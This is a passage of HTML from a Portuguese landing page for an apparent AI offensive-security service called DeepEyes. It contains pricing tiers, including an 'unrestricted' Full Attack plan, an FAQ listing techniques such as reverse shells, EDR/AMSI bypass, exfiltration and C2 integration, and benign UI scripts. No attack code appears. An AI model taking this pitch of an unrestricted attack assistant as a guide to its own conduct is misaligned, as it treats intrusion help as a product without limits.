                                        <span>Chat com IA</span>
                                    </div>
                                    <div class="feature-item included">
                                        <i class="fas fa-check"></i>
                                        <span>200 requisições/dia</span>
                                    </div>
                                    <div class="feature-item included">
                                        <i class="fas fa-check"></i>
                                        <span>Sessões ilimitadas</span>
                                    </div>
                                    <div class="feature-item included">
                                        <i class="fas fa-check"></i>
                                        <span>Terminal Integrado</span>
                                    </div>
                                    <div class="feature-item included">
                                        <i class="fas fa-check"></i>
                                        <span>Scanner de Vulnerabilidades</span>
                                    </div>
                                    <div class="feature-item included">
                                        <i class="fas fa-check"></i>
                                        <span>Checklist OWASP</span>
                                    </div>
                                    <div class="feature-item excluded">
                                        <i class="fas fa-times"></i>
                                        <span>Geração de Relatórios</span>
                                    </div>
                                    <div class="feature-item excluded">
                                        <i class="fas fa-times"></i>
                                        <span>Perfil Full Attack</span>
                                    </div>
                                </div>
                                <a href="https://wa.me/5511940968290?text=Ol%C3%A1!%20Tenho%20interesse%20no%20plano%20RED%20TEAM%20(R%2449%2Fm%C3%AAs)%20do%20DeepEyes.%20Gostaria%20de%20mais%20informa%C3%A7%C3%B5es%20para%20assinar." target="_blank" class="pricing-btn redteam"><i class="fab fa-whatsapp mr-2"></i>Assinar Red Team</a>
                            </div>

                            <!-- Plano Full Attack -->
                            <div class="pricing-card premium">
                                <div class="pricing-header">
                                    <span class="pricing-badge fullattack">FULL ATTACK</span>
                                    <h3 class="pricing-name">Full Attack</h3>
                                    <div class="pricing-price">
                                        <span class="price-currency">R$</span>
                                        <span class="price-value">99</span>
                                        <span class="price-period">/mês</span>
                                    </div>
                                    <p class="pricing-description">Acesso completo sem restrições</p>
                                </div>
                                <div class="pricing-features">
                                    <div class="feature-item included">
                                        <i class="fas fa-check"></i>
                                        <span>Todos os Perfis</span>
                                    </div>
                                    <div class="feature-item included">
                                        <i class="fas fa-check"></i>
                                        <span>Chat com IA</span>
                                    </div>
                                    <div class="feature-item included">
                                        <i class="fas fa-check"></i>
                                        <span>500 requisições/dia</span>
                                    </div>
                                    <div class="feature-item included">
                                        <i class="fas fa-check"></i>
                                        <span>Sessões ilimitadas</span>
                                    </div>
                                    <div class="feature-item included">
                                        <i class="fas fa-check"></i>
                                        <span>Terminal Integrado</span>
                                    </div>
                                    <div class="feature-item included">
                                        <i class="fas fa-check"></i>
                                        <span>Scanner de Vulnerabilidades</span>
                                    </div>
                                    <div class="feature-item included">
                                        <i class="fas fa-check"></i>
                                        <span>Checklist OWASP</span>
                                    </div>
                                    <div class="feature-item included">
                                        <i class="fas fa-check"></i>
                                        <span>Geração de Relatórios</span>
                                    </div>
                                    <div class="feature-item included">
                                        <i class="fas fa-check"></i>
                                        <span>Suporte Prioritário</span>
                                    </div>
                                </div>
                                <a href="https://wa.me/5511940968290?text=Ol%C3%A1!%20Tenho%20interesse%20no%20plano%20FULL%20ATTACK%20(R%2499%2Fm%C3%AAs)%20do%20DeepEyes.%20Gostaria%20de%20mais%20informa%C3%A7%C3%B5es%20para%20assinar." target="_blank" class="pricing-btn fullattack"><i class="fab fa-whatsapp mr-2"></i>Assinar Full Attack</a>
                            </div>
                        </div>

                        <p class="pricing-note">
                            <i class="fas fa-shield-check"></i>
                            Pagamento seguro • Cancele quando quiser • Garantia de 7 dias
                        </p>
                    </div>
                </section>
            </div>

            <!-- FAQ Section -->
            <div class="fade-section">
                <section id="faq" class="faq">
                    <div class="container">
                        <div class="section-header">
                            <span class="section-tag mono">// FAQ</span>
                            <h2 class="section-title">Perguntas Frequentes</h2>
                        </div>

                        <div class="faq-list">
                            <div class="faq-item" onclick="toggleFaq(this)">
                                <div class="faq-question">
                                    <span>O que é o DeepEyes?</span>
                                    <span class="faq-icon">+</span>
                                </div>
                                <div class="faq-answer">
                                    <p>DeepEyes é uma plataforma de IA especializada em segurança ofensiva. Ela auxilia profissionais de segurança em testes de penetração, simulações de Red Team e análises de vulnerabilidades em ambientes controlados.</p>
                                </div>
                            </div>
                            <div class="faq-item" onclick="toggleFaq(this)">
                                <div class="faq-question">
                                    <span>Posso usar em produção?</span>
                                    <span class="faq-icon">+</span>
                                </div>
                                <div class="faq-answer">
                                    <p>O DeepEyes deve ser usado APENAS em ambientes autorizados, como laboratórios de teste, CTFs ou infraestruturas onde você tem permissão explícita para realizar testes de segurança. Nunca use em sistemas de produção sem autorização.</p>
                                </div>
                            </div>
                            <div class="faq-item" onclick="toggleFaq(this)">
                                <div class="faq-question">
                                    <span>A IA simula ataques reais?</span>
                                    <span class="faq-icon">+</span>
                                </div>
                                <div class="faq-answer">
                                    <p>Sim, o DeepEyes utiliza técnicas reais de ataque, incluindo exploits conhecidos, técnicas de evasão e frameworks C2. Todas as simulações são baseadas em TTPs (Táticas, Técnicas e Procedimentos) documentados.</p>
                                </div>
                            </div>
                            <div class="faq-item" onclick="toggleFaq(this)">
                                <div class="faq-question">
                                    <span>É seguro/legal usar?</span>
                                    <span class="faq-icon">+</span>
                                </div>
                                <div class="faq-answer">
                                    <p>O uso é legal quando realizado em ambientes autorizados. O operador é totalmente responsável por garantir que possui autorização para realizar testes. O DeepEyes é uma ferramenta educacional e profissional para hackers éticos.</p>
                                </div>
                            </div>
                            <div class="faq-item" onclick="toggleFaq(this)">
                                <div class="faq-question">
                                    <span>Quais técnicas ela domina?</span>
                                    <span class="faq-icon">+</span>
                                </div>
                                <div class="faq-answer">
                                    <p>SQL Injection, XSS, CSRF, Reverse Shells, Privilege Escalation (Windows/Linux), Bypass de EDR/AMSI/WAF, Password Attacks, Lateral Movement, Persistence, Exfiltration, e integração com frameworks C2 como Cobalt Strike e Metasploit.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
            </div>

            <!-- Social Proof Section -->
            <div class="fade-section">
                <section class="social-proof">
                    <div class="container">
                        <p class="trust-text mono">Confiado por hackers éticos em +12 países</p>
                        
                        <div class="logos-grid">
                            <div class="logo-item mono">HackTheBox</div>
                            <div class="logo-item mono">TryHackMe</div>
                            <div class="logo-item mono">CTF Brasil</div>
                            <div class="logo-item mono">CyberOps</div>
                            <div class="logo-item mono">RedTeam Labs</div>
                            <div class="logo-item mono">SecForce</div>
                        </div>
                    </div>
                </section>
            </div>

            <!-- Footer -->
            <footer class="footer">
                <div class="container">
                    <div class="footer-grid">
                        <div class="footer-brand">
                            <div class="footer-logo">
                                <img src="/logo.png" alt="DeepEyes" class="logo-img">
                                <span class="logo-text">DeepEyes</span>
                            </div>
                            <p class="footer-description">
                                Plataforma de IA especializada em segurança ofensiva para profissionais de pentest e red team.
                            </p>
                            <div class="footer-social">
                                <a href="#" title="GitHub">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
                                </a>
                                <a href="#" title="Twitter">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
                                </a>
                                <a href="#" title="Discord">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189Z"/></svg>
                                </a>
                            </div>
                        </div>

                        <div class="footer-column">
                            <h4>Produto</h4>
                            <ul>
                                <li><a href="/#como-funciona">Como Funciona</a></li>
                                <li><a href="/#recursos">Recursos</a></li>
                                <li><a href="/#demo">Demo</a></li>
                                <li><a href="/chat">Acessar Lab</a></li>
                            </ul>
                        </div>

                        <div class="footer-column">
                            <h4>Recursos</h4>
                            <ul>
                                <li><a href="/docs">Documentação</a></li>
                                <li><a href="/docs#prompts">Guia de Prompts</a></li>
                                <li><a href="/docs#casos-uso">Casos de Uso</a></li>
                                <li><a href="/#faq">FAQ</a></li>
                            </ul>
                        </div>

                        <div class="footer-column">
                            <h4>Legal</h4>
                            <ul>
                                <li><a href="#">Termos de Uso</a></li>
                                <li><a href="#">Política de Privacidade</a></li>
                                <li><a href="#">Uso Responsável</a></li>
                                <li><a href="#">Contato</a></li>
                            </ul>
                        </div>
                    </div>

                    <div class="footer-bottom">
                        <p class="copyright mono">© 2024 DeepEyes. Todos os direitos reservados.</p>
                        <div class="footer-legal">
                            <a href="#">Termos</a>
                            <a href="#">Privacidade</a>
                            <a href="#">Cookies</a>
                        </div>
                    </div>
                </div>
            </footer>
        </div>
    </div>

    <script>
        // Verifica se o usuário foi redirecionado por falta de autenticação
        (function checkLoginRequired() {
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.get('login') === 'required') {
                // Redireciona para o chat que tem o modal de login
                window.location.href = '/chat?login=required';
            }
        })();

        // Toggle Tools Dropdown
        function toggleToolsDropdown(event) {
            event.preventDefault();
            event.stopPropagation();
            const dropdown = event.target.closest('.tools-dropdown');
            dropdown.classList.toggle('open');
        }

        // Close dropdown when clicking outside
        document.addEventListener('click', function(e) {
            const dropdown = document.querySelector('.tools-dropdown');
            if (dropdown && !dropdown.contains(e.target)) {
                dropdown.classList.remove('open');
            }
        });

        // Toggle mobile nav
        function toggleNav() {
            const navLinks = document.getElementById('navLinks');
            const navIcon = document.getElementById('navIcon');
            navLinks.classList.toggle('active');
            navIcon.textContent = navLinks.classList.contains('active') ? '✕' : '☰';
        }

        // FAQ accordion
        function toggleFaq(element) {
            const allItems = document.querySelectorAll('.faq-item');
            const isOpen = element.classList.contains('open');
            
            allItems.forEach(item => {
                item.classList.remove('open');
                item.querySelector('.faq-icon').textContent = '+';
            });
            
            if (!isOpen) {
                element.classList.add('open');
                element.querySelector('.faq-icon').textContent = '−';
            }
        }

        // Scroll fade effect
        function handleScrollFade() {
            const sections = document.querySelectorAll('.fade-section');
            sections.forEach(section => {
                const rect = section.getBoundingClientRect();
                const windowHeight = window.innerHeight;
                
                if (rect.top < windowHeight * 0.85 && rect.bottom > 0) {
                    const opacity = Math.min(1, (windowHeight * 0.85 - rect.top) / (windowHeight * 0.3));
                    const translateY = Math.max(0, 30 - (opacity * 30));
                    section.style.opacity = Math.max(0, Math.min(1, opacity));
                    section.style.transform = `translateY(${translateY}px)`;
                }
            });
        }

        window.addEventListener('scroll', handleScrollFade);
        window.addEventListener('load', handleScrollFade);
    </script>

    <!-- Ghost Background Effect - Animated Smoke/Fog -->
    <!-- Ghost Background Effect - Animated Smoke/Fog -->
    <script>
        (function() {
            const canvas = document.getElementById('ghost-background');
            if (!canvas) return;

            const gl = canvas.getContext('webgl', { 
                alpha: false, 
                premultipliedAlpha: false,
                antialias: false,
                powerPreference: 'high-performance'
            });
            if (!gl) return;

            const vertexShaderSource = `
                attribute vec2 a_position;
                void main() {
                    gl_Position = vec4(a_position, 0.0, 1.0);
                }
            `;

            const fragmentShaderSource = `
                precision highp float;
                uniform float u_time;
                uniform vec2 u_resolution;
                uniform vec2 u_mouse;

                // Noise functions
                float hash(vec2 p) { 
                    return fract(sin(dot(p, vec2(127.1, 311.7))) * 43758.5453123); 
                }

                float noise(vec2 p) {
                    vec2 i = floor(p);
                    vec2 f = fract(p);
                    f = f * f * (3.0 - 2.0 * f);
                    return mix(
                        mix(hash(i + vec2(0.0, 0.0)), hash(i + vec2(1.0, 0.0)), f.x),
                        mix(hash(i + vec2(0.0, 1.0)), hash(i + vec2(1.0, 1.0)), f.x), 
                        f.y
                    );
                }

                float fbm(vec2 p) {
                    float v = 0.0;
                    float a = 0.5;
                    mat2 m = mat2(cos(0.5), sin(0.5), -sin(0.5), cos(0.5));
                    for(int i = 0; i < 6; i++) {
                        v += a * noise(p);
                        p = m * p * 2.0;
                        a *= 0.5;
                    }
                    return v;
                }

                void main() {
                    vec2 uv = gl_FragCoord.xy / u_resolution.xy;
                    vec2 p = (gl_FragCoord.xy * 2.0 - u_resolution.xy) / min(u_resolution.x, u_resolution.y);
                    
                    float t = u_time * 0.15;
                    
                    // Multiple layers of animated smoke/fog
                    vec2 q = vec2(
                        fbm(p + t * 0.3),
                        fbm(p + vec2(5.2, 1.3) + t * 0.2)
                    );
                    
                    vec2 r = vec2(
                        fbm(p + q * 1.5 + vec2(1.7, 9.2) + t * 0.25),
                        fbm(p + q * 1.5 + vec2(8.3, 2.8) + t * 0.35)
                    );
                    
                    vec2 s = vec2(
                        fbm(p + r * 2.0 + vec2(3.1, 4.7) + t * 0.1),
                        fbm(p + r * 2.0 + vec2(6.5, 1.2) + t * 0.15)
                    );
                    
                    float f = fbm(p + s * 1.5);
                    
                    // Mouse interaction - subtle glow near cursor
                    vec2 mousePos = u_mouse * 2.0 - 1.0;
                    mousePos.x *= u_resolution.x / u_resolution.y;
                    float mouseDist = length(p - mousePos);
                    float mouseGlow = smoothstep(0.8, 0.0, mouseDist) * 0.3;
                    
                    // Color palette - dark purple/cyan theme
                    vec3 bgColor = vec3(0.039, 0.039, 0.059); // #0a0a0f
                    vec3 color1 = vec3(0.694, 0.620, 0.937);  // #B19EEF purple
                    vec3 color2 = vec3(0.0, 0.831, 1.0);      // #00d4ff cyan
                    vec3 color3 = vec3(0.0, 1.0, 0.533);      // #00ff88 green
                    
                    // Mix colors based on noise
                    vec3 col = bgColor;
                    
                    // Add subtle fog layers
                    float fog1 = smoothstep(0.3, 0.8, f) * 0.15;
                    float fog2 = smoothstep(0.4, 0.9, fbm(p * 2.0 + t * 0.2)) * 0.1;
                    float fog3 = smoothstep(0.5, 1.0, fbm(p * 0.5 - t * 0.1)) * 0.08;
                    
                    col += color1 * fog1;
                    col += color2 * fog2;
                    col += color3 * fog3 * 0.5;
                    
                    // Add mouse glow
                    col += mix(color1, color2, sin(u_time * 0.5) * 0.5 + 0.5) * mouseGlow;
                    
                    // Vignette effect
                    float vignette = 1.0 - smoothstep(0.5, 1.5, length(p * 0.7));
                    col *= vignette * 0.8 + 0.2;
                    
                    // Add subtle grain
                    float grain = (hash(uv * u_time * 100.0) - 0.5) * 0.03;
                    col += grain;
                    
                    gl_FragColor = vec4(col, 1.0);
                }
            `;

            function createShader(gl, type, source) {
                const shader = gl.createShader(type);
                gl.shaderSource(shader, source);
                gl.compileShader(shader);
                if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) {
                    console.error('Shader error:', gl.getShaderInfoLog(shader));
                    gl.deleteShader(shader);
                    return null;
                }
                return shader;
            }

            function createProgram(gl, vs, fs) {
                const program = gl.createProgram();
                gl.attachShader(program, vs);
                gl.attachShader(program, fs);
                gl.linkProgram(program);
                if (!gl.getProgramParameter(program, gl.LINK_STATUS)) {
                    console.error('Program error:', gl.getProgramInfoLog(program));
                    return null;
                }
                return program;
            }

            const vs = createShader(gl, gl.VERTEX_SHADER, vertexShaderSource);
            const fs = createShader(gl, gl.FRAGMENT_SHADER, fragmentShaderSource);
            if (!vs || !fs) return;

            const program = createProgram(gl, vs, fs);
            if (!program) return;

            const positionBuffer = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([
                -1, -1, 1, -1, -1, 1,
                -1, 1, 1, -1, 1, 1
            ]), gl.STATIC_DRAW);

            const positionLocation = gl.getAttribLocation(program, 'a_position');
            const timeLocation = gl.getUniformLocation(program, 'u_time');
            const resolutionLocation = gl.getUniformLocation(program, 'u_resolution');
            const mouseLocation = gl.getUniformLocation(program, 'u_mouse');

            let mouse = { x: 0.5, y: 0.5 };
            let targetMouse = { x: 0.5, y: 0.5 };

            function resize() {
                const dpr = Math.min(window.devicePixelRatio || 1, 1.5);
                canvas.width = window.innerWidth * dpr;
                canvas.height = window.innerHeight * dpr;
                canvas.style.width = window.innerWidth + 'px';
                canvas.style.height = window.innerHeight + 'px';
                gl.viewport(0, 0, canvas.width, canvas.height);
            }

            function animate(time) {
                const t = time * 0.001;

                // Smooth mouse movement
                mouse.x += (targetMouse.x - mouse.x) * 0.05;
                mouse.y += (targetMouse.y - mouse.y) * 0.05;

                gl.useProgram(program);
                gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
                gl.enableVertexAttribArray(positionLocation);
                gl.vertexAttribPointer(positionLocation, 2, gl.FLOAT, false, 0, 0);

                gl.uniform1f(timeLocation, t);
                gl.uniform2f(resolutionLocation, canvas.width, canvas.height);
                gl.uniform2f(mouseLocation, mouse.x, mouse.y);

                gl.drawArrays(gl.TRIANGLES, 0, 6);

                requestAnimationFrame(animate);
            }

            document.addEventListener('mousemove', (e) => {
                targetMouse.x = e.clientX / window.innerWidth;
                targetMouse.y = 1.0 - (e.clientY / window.innerHeight);
            }, { passive: true });

            window.addEventListener('resize', resize);
            resize();
            requestAnimationFrame(animate);
        })();
    </script>

    <!-- Fuzzy Text Effect -->
    <script>
        (function() {
            const fuzzyElements = document.querySelectorAll('.fuzzy-text');
            if (!fuzzyElements.length) return;

            function initFuzzyText(element) {
                // Remove existing canvas if any
                const existingCanvas = element.querySelector('canvas');
                if (existingCanvas) existingCanvas.remove();
                element.classList.remove('active');

                const text = element.dataset.text || element.textContent.trim();
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                if (!ctx) return;

                // Get computed styles
                const computedStyle = window.getComputedStyle(element);
                const fontSize = computedStyle.fontSize;
                const fontWeight = computedStyle.fontWeight;
                const fontFamily = computedStyle.fontFamily;
                
                // Create gradient colors
                const gradientColors = ['#00d4ff', '#00ff88']; // cyan to green
                
                // Setup offscreen canvas for text measurement
                const offscreen = document.createElement('canvas');
                const offCtx = offscreen.getContext('2d');
                if (!offCtx) return;

                offCtx.font = `${fontWeight} ${fontSize} ${fontFamily}`;
                offCtx.textBaseline = 'alphabetic';
                
                const metrics = offCtx.measureText(text);
                const numericFontSize = parseFloat(fontSize);
                
                const actualLeft = metrics.actualBoundingBoxLeft || 0;
                const actualRight = metrics.actualBoundingBoxRight || metrics.width;
                const actualAscent = metrics.actualBoundingBoxAscent || numericFontSize * 0.8;
                const actualDescent = metrics.actualBoundingBoxDescent || numericFontSize * 0.2;
                
                const textWidth = Math.ceil(actualLeft + actualRight);
                const textHeight = Math.ceil(actualAscent + actualDescent);
                
                const horizontalMargin = Math.max(40, numericFontSize * 0.5);
                const verticalMargin = Math.max(15, numericFontSize * 0.2);
                
                offscreen.width = textWidth + 20;
                offscreen.height = textHeight + 10;
                
                // Draw text with gradient on offscreen canvas
                offCtx.font = `${fontWeight} ${fontSize} ${fontFamily}`;
                offCtx.textBaseline = 'alphabetic';
                
                // Create gradient
                const gradient = offCtx.createLinearGradient(0, 0, textWidth, 0);
                gradient.addColorStop(0, gradientColors[0]);
                gradient.addColorStop(1, gradientColors[1]);
                offCtx.fillStyle = gradient;
                offCtx.fillText(text, 10, actualAscent + 5);
                
                // Setup main canvas
                canvas.width = textWidth + horizontalMargin * 2;
                canvas.height = textHeight + verticalMargin * 2;
                canvas.style.width = canvas.width + 'px';
                canvas.style.height = canvas.height + 'px';
                
                // Insert canvas
                element.appendChild(canvas);
                element.classList.add('active');
                
                // Animation state
                let isHovering = false;
                const baseIntensity = 0.12;
                const hoverIntensity = 0.35;
                const fuzzRange = Math.max(20, numericFontSize * 0.4);
                let animationId;
                
                function animate() {
                    ctx.clearRect(0, 0, canvas.width, canvas.height);
                    
                    const intensity = isHovering ? hoverIntensity : baseIntensity;
                    
                    // Draw each row with random horizontal offset
                    for (let j = 0; j < offscreen.height; j++) {
                        const dx = Math.floor(intensity * (Math.random() - 0.5) * fuzzRange);
                        ctx.drawImage(
                            offscreen, 
                            0, j, offscreen.width, 1,
                            horizontalMargin + dx, verticalMargin + j, offscreen.width, 1
                        );
                    }
                    
                    animationId = requestAnimationFrame(animate);
                }
                
                // Mouse events
                canvas.addEventListener('mouseenter', () => { isHovering = true; });
                canvas.addEventListener('mouseleave', () => { isHovering = false; });
                
                // Touch events
                canvas.addEventListener('touchstart', () => { isHovering = true; }, { passive: true });
                canvas.addEventListener('touchend', () => { isHovering = false; }, { passive: true });
                
                // Start animation
                animate();
                
                // Store cleanup function
                element._fuzzyCleanup = () => {
                    cancelAnimationFrame(animationId);
                };
            }

            // Initialize all fuzzy text elements
            fuzzyElements.forEach(initFuzzyText);

            // Reinitialize on resize (debounced)
            let resizeTimeout;
            window.addEventListener('resize', () => {
                clearTimeout(resizeTimeout);
                resizeTimeout = setTimeout(() => {
                    fuzzyElements.forEach(el => {
                        if (el._fuzzyCleanup) el._fuzzyCleanup();
                        initFuzzyText(el);
                    });
                }, 250);
            });
        })();
    </script>
</body>
</html>